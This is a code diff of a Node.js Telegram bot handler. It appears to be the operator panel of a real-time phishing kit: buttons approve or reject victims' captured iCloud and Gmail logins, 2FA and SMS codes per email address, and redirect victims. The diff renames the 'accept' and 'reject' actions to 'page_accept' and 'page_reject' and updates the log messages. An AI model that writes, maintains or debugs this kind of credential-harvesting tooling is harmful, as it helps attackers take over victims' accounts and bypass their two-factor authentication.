@@ -31,13 +31,13 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "accept" ? "ICLOUD ACCEPT" : action === "reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
 
     // ✅ Map iCloud accept/reject to correct status
     let statusForBackend = action;
-    if (action === "accept") {
+    if (action === "page_accept") {
       statusForBackend = "accepted";
-    } else if (action === "reject") {
+    } else if (action === "page_reject") {
       statusForBackend = "rejected";
     }
 
@@ -100,12 +100,12 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
-      } else if (action === "accept") {
+      } else if (action === "page_accept") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
-        console.log(`✅ ACCEPT matched! Message: ${statusMessage}`);
-      } else if (action === "reject") {
+        console.log(`✅ PAGE_ACCEPT matched! Message: ${statusMessage}`);
+      } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
-        console.log(`❌ REJECT matched! Message: ${statusMessage}`);
+        console.log(`❌ PAGE_REJECT matched! Message: ${statusMessage}`);
       } else if (action === "sms_accept") {
         statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
